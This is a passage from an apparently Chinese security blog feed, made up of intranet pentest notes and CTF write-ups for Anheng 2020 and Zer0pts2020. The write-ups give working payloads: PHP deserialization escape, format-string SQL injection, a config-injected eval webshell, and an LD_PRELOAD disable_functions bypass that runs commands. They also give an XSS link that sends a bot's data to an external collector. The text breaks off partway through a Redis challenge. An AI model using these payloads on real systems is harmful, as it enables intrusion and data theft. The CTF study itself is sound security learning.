<p>收集所有活动域的会话列表：<code>NetSess -h</code>，使用的是<a href="http://www.joeware.net/freetools/tools/netsess/index.htm" target="_blank" rel="noopener">NetSess.exe</a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200423114153-5f44aee6-8514-1.png" target="_blank" rel="noopener"><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114153-5f44aee6-8514-1.png" alt="img"></a><br>目前还没有任何会话，所以显示无</p>
</blockquote>
<blockquote>
<ul>
<li>## 利用powershell收集域信息</li>
</ul>
<p>首先要将powershell的权限限制更改为<strong>RemoteSigned</strong>，这样就可以执行本地上的脚本</p>
<p>输入：<code>Get-ExecutionPolicy</code>，发现自己并不是RemoteSigned权限，输入：<code>Set-ExecutionPolicy RemoteSigned</code>，按Y确定即可，在本地虚拟机测试时还可以将脚本权限改为<strong>Unrestricter</strong>，这样可以执行来自网络与本地的任何脚本</p>
<p>此处要使用的脚本在PowerSploit/Recon中，将要用到的PowerView.ps1传入靶机，在powershell中打开该脚本目录并导入：<code>Import-Module .\PowerView.ps1</code>就可以进行收集了</p>
<p>具体命令的相关用法在<code>PowerSploit/Recon/READE.md</code>中</p>
</blockquote>
<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\\\域控(如pc.xx.com) password &#x2F;user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年安恒四月月赛</title>
    <url>/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<p>比赛时只做出了一个web，这次安恒月赛质量很好，还提供了复现👍👍👍</p>
<a id="more"></a>

<h1 id="0x01-Ezunserialize"><a href="#0x01-Ezunserialize" class="headerlink" title="0x01 Ezunserialize"></a>0x01 Ezunserialize</h1><p>考点 :字符串逃逸反序列化</p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure>

<p>感觉更像是一道计算题，重点是因为在read的时候会把<code>\0\0\0</code>====&gt;<code>chr(0) . &#39;*&#39; . chr(0)</code></p>
<p>这样长度就会变短，</p>
<p>正常的A类的序列化结果应为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:8:&quot;mount4in&quot;;s:8:&quot;password&quot;;s:8:&quot;password&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>通过字符的逃逸可以将序列化结果改变成类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:8:&quot;mount4in&quot;;s:2:&quot;st&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>就可以触发反序列化，读取flag.php。</p>
<p>然后就是数学的计算。通过在username中添加\0\0\0,在password中添加payload,通过一个<code>\0\0\0</code>会吃掉三个三个字符，最后改变序列化内容为可触发读文件的payload。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:53:&quot;admin\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:68:&quot;&quot;&quot;;s:2:&quot;st&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501182039560.png" alt="image-20200501182039560" style="zoom:200%;">

<p>传入这个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> A(<span class="string">"admin\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0"</span>, <span class="string">'"";s:2:"st";O:1:"B":1:&#123;s:1:"b";O:1:"C":1:&#123;s:1:"c";s:8:"flag.php";&#125;&#125;&#125;'</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501182343230.png" alt="image-20200501182343230"></p>
<h1 id="0x02-babytricks"><a href="#0x02-babytricks" class="headerlink" title="0x02 babytricks"></a>0x02 babytricks</h1><p>扫目录</p>
<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501185458689.png" alt="image-20200501185458689"></p>
<p>抓包可以看到</p>
<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501183423342.png" alt="image-20200501183423342"></p>
<p>应该是格式化字符串导致的sql注入，</p>
<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501185254219.png" alt="image-20200501185254219"></p>
<p>也可以user=admin%1$c#&amp;passwd=39</p>
<p>user=%1$&amp;passwd=^0#</p>
<p>不知道为啥没出密码，用下别人的吧。</p>
<p>更新：比赛时是非预期，需要用between盲注。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%1$c+0 adn passwd between CONCAT(&quot;&#123;&#125;&quot;,BINARY(&quot;&quot;)) and CONCAT(&quot;&#123;&#125;&quot;,BINARY(&quot;&quot;)) #</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; 1</span><br><span class="line">    [id] &#x3D;&gt; 1</span><br><span class="line">    [1] &#x3D;&gt; admin</span><br><span class="line">    [user] &#x3D;&gt; admin</span><br><span class="line">    [2] &#x3D;&gt; GoODLUcKcTFer202OHAckFuN</span><br><span class="line">    [passwd] &#x3D;&gt; GoODLUcKcTFer202OHAckFuN</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>然后admin/index.php登进后台，</p>
<img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501185735317.png" alt="image-20200501185735317" style="zoom:150%;">

<p>这里就是之前p神分享过的<a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">经典写配置漏洞与几种变形</a>,通过</p>
<p>?shell=;eval($_POST[2333]);</p>
<p>?shell=$0</p>
<p>之后就可以得到shell，连上蚁剑，查看phpinfo，可以看到disable_function</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,error_log,dl,FFI::cdef,debug_backtrace,imap_mail,mb_send_mail</span><br></pre></td></tr></table></figure>

<p>过滤了很多函数,蚁剑的所有插件都不可以用，而且open_basedir为 /var/www/html</p>
<p>可以使用glob绕过open_basedir读跟目录文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($dh = opendir(<span class="string">'glob:///*'</span>)) &#123;</span><br><span class="line">	<span class="keyword">while</span> (($file = readdir($dh)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $file.<span class="string">' '</span>;</span><br><span class="line">	&#125;</span><br><span class="line">  closedir($dh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/////////////////////////////////////////////</span></span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span> ($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/////////////////////////////////////////////</span></span><br><span class="line">var_dump(scandir(<span class="string">'glob:///*'</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501222949625.png" alt="image-20200501222949625"></p>
<p>之后通过gnupg来绕过disable_function</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">$out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">$evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">$so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line"></span><br><span class="line">$res = gnupg_init();</span><br><span class="line">gnupg_seterrormode($res,GNUPG_ERROR_WARNING);</span><br><span class="line">$info = gnupg_keyinfo($res,<span class="string">'your-key-id'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Key - Info&lt;pre&gt;"</span>;</span><br><span class="line">var_dump($info);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：以下部分加上刷新后仍可用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gnupg_seterrormode($res,GNUPG_ERROR_WARNING);</span><br><span class="line">$info = gnupg_keyinfo($res,<span class="string">'your-key-id'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Key - Info&lt;pre&gt;"</span>;</span><br><span class="line">var_dump($info);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10010&#x2F;admin&#x2F;shells&#x2F;wFY2g1Ukgo8rdrUJ&#x2F;bypass_gnupg.php?cmd&#x3D;cat &#x2F;flag&amp;outpath&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;admin&#x2F;shells&#x2F;wFY2g1Ukgo8rdrUJ&#x2F;dd&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;admin&#x2F;shells&#x2F;wFY2g1Ukgo8rdrUJ&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p>然后getflag。</p>
<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200502083056197.png" alt="image-20200502083056197"></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020 Writeup</title>
    <url>/2020/04/30/Zer0pts2020-musicblog/</url>
    <content><![CDATA[<p>strip_tags()函数bug</p>
<p>记录复现Zer0pts2020部分题目</p>
<a id="more"></a>

<h1 id="0x01-musicblog"><a href="#0x01-musicblog" class="headerlink" title="0x01 musicblog"></a>0x01 musicblog</h1><p>题目给了源码，目录结构如下</p>
<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430231714733.png" alt="image-20200430231714733" style="zoom:200%;">

<p>测试网站可以注册、登录、发布blog等。</p>
<p>看worker.js源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">'zer0pts&#123;&lt;censored&gt;&#125;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'networkidle0'</span>,</span><br><span class="line">            timeout: <span class="number">10</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> page.click(<span class="string">'#like'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br></pre></td></tr></table></figure>

<p>这里crawl函数会将flag放到User-Agent中，导航到url，然后点击id为like的标签。所以可以确定为xss了。</p>
<p>然后阅读源码，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'util.php'</span>;</span><br><span class="line"></span><br><span class="line">$nonce = get_nonce();</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'nonce-$&#123;nonce&#125;' 'strict-dynamic'; base-uri 'none'; trusted-types"</span>);</span><br><span class="line">header(<span class="string">'X-Frame-Options: DENY'</span>);</span><br><span class="line">header(<span class="string">'X-XSS-Protection: 1; mode=block'</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>设置了csp，无法跨域请求，且js必须具有$nonce值才能被加载执行，然后寻找可以触发xss的地方，bot会点击id为like的标签，在访问post.php?id=xx时</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233401847.png" alt="image-20200430233401847"></p>
<p>具有like的标签，可知bot会定时访问post.php页面，在post时</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233540707.png" alt="image-20200430233540707"></p>
<p>会将<code>[[URL]]</code>转换成<code>&lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</code>,并且点击上图框中选项，bot会check your post,确定xss。</p>
<p>然后看源码里对<code>[[URL]]</code>的处理，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src="URL"&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">'/\[\[(.+?)\]\]/'</span>, <span class="string">'&lt;audio controls src="\\1"&gt;&lt;/audio&gt;'</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">'&lt;audio&gt;'</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过查找资料可以找到strip_tags()函数有bug。</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233936071.png" alt="image-20200430233936071"></p>
<p><a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a></p>
<p>也就是不会过滤<code>&lt;a/udio&gt;</code>，并且<code>&lt;a/udio&gt;</code>会作为 超链接<code>&lt;a&gt;</code>被解析，而超链接的跳转是不受<strong>CSP限制</strong>的。</p>
<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430234206184.png" alt="image-20200430234206184" style="zoom:200%;">

<p>然后在post时将content设置为如下payload</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a/udio  href=<span class="string">"http://xss.buuoj.cn/index.php?do=api&amp;id=UrvHLW"</span> id=like&gt;x&lt;<span class="regexp">/a/u</span>dio&gt;</span><br><span class="line">or</span><br><span class="line">[[<span class="string">"&gt;&lt;/audio&gt;&lt;a/udio href="</span>http:<span class="comment">//xss.buuoj.cn/index.php?do=api&amp;id=UrvHLW" id=like&gt;test&lt;/a/udio&gt;&lt;audio a="]]</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501000509269.png" alt="image-20200501000509269"></p>
<p>可以看到已经添加了到xss平台的标签。</p>
<ul>
<li>第一个payload</li>
</ul>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501000449539.png" alt="image-20200501000449539"></p>
<ul>
<li>第二个payload</li>
</ul>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430235654042.png" alt="image-20200430235654042"></p>
<p>然后可得flag。</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430235007637.png" alt="image-20200430235007637"></p>
<h1 id="0x02-urlapp"><a href="#0x02-urlapp" class="headerlink" title="0x02 urlapp"></a>0x02 urlapp</h1><p>题目源码</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'uri'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">()</span></span></span><br><span class="line">  sock = TCPSocket.open(<span class="string">"redis"</span>, <span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ping(sock) <span class="keyword">then</span></span><br><span class="line">    exit</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sock</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(sock, cmd)</span></span></span><br><span class="line">  sock.write(cmd + <span class="string">"\r\n"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(sock)</span></span></span><br><span class="line">  data = sock.gets</span><br><span class="line">  <span class="keyword">if</span> data == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">"+"</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> data[<span class="number">1</span>..-<span class="number">1</span>].strip</span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">"$"</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">"$-1\r\n"</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> sock.gets.strip</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">(sock)</span></span></span><br><span class="line">  query(sock, <span class="string">"ping"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">"PONG"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">"SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">"OK"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">"GET <span class="subst">#&#123;key&#125;</span>"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">"flag"</span>, File.read(<span class="string">"flag.txt"</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">'index.html'</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">"H*"</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">"<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>审计源码后可以得到代码的逻辑，首先会把flag.txt文件的内容，保存到redis数据库中，对应的键为flag，然后有个改变url长度的功能，post传入一个url，然后检测url，之后将url存储到redis数据库中，对应的键为随机生成的8位字符的十六进制，然后输出对应的键，</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501130254421.png" alt="image-20200501130254421"></p>
<p>然后访问上图框中的地址，服务端会跳转到上面的链接。</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501133518039.png" alt="image-20200501133518039"></p>
<p>服务端首先检测q，是否为16位[0-9a-f]的字符，</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501133638134.png" alt="image-20200501133638134"></p>
<p>然后查q对应的值，然后重定向到url。</p>
<p>redirect:</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501135806818.png" alt="image-20200501135806818"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rename-command AUTH &quot;&quot;</span><br><span class="line">rename-command RENAME &quot;&quot;</span><br><span class="line">rename-command RENAMENX &quot;&quot;</span><br><span class="line">rename-command FLUSHDB &quot;&quot;</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command MULTI &quot;&quot;</span><br><span class="line">rename-command EXEC &quot;&quot;</span><br><span class="line">rename-command DISCARD &quot;&quot;</span><br><span class="line">rename-command WATCH &quot;&quot;</span><br><span class="line">rename-command UNWATCH &quot;&quot;</span><br><span class="line">rename-command SUBSCRIBE &quot;&quot;</span><br><span class="line">rename-command UNSUBSCRIBE &quot;&quot;</span><br><span class="line">rename-command PUBLISH &quot;&quot;</span><br><span class="line">rename-command SAVE &quot;&quot;</span><br><span class="line">rename-command BGSAVE &quot;&quot;</span><br><span class="line">rename-command LASTSAVE &quot;&quot;</span><br><span class="line">rename-command SHUTDOWN &quot;&quot;</span><br><span class="line">rename-command 